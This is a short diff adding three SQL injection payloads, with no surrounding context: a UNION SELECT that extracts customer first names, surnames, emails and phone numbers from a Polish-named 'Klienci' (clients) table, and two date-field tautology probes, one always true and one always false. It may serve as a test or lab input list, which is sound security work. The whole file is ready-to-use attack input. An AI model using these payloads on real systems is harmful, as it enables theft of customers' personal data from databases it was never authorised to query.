@@ -1,0 +1,3 @@
+' UNION SELECT Imie, Nazwisko, Email, Telefon FROM Klienci -- 
+2024-01-01' OR '1'='1
+2024-01-01' OR '1'='3
